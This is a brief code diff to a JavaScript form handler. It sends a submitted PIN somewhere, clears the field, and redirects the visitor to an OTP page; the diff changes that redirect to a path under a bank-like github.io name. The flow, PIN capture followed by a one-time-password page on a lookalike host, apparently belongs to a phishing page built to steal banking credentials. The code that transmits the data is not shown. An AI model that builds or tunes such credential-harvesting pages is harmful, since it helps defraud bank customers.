@@ -19,7 +19,7 @@ document.getElementById("myForm").onsubmit = function (event) {
       console.log("Sent successfully:", response);
       pin.value = "";
 
-      location.href = "/otp.html";
+      location.href = "/m-V-bank.xyz.github.io/otp.html";
     },
     function (error) {
       console.log("Failed to send:", error);
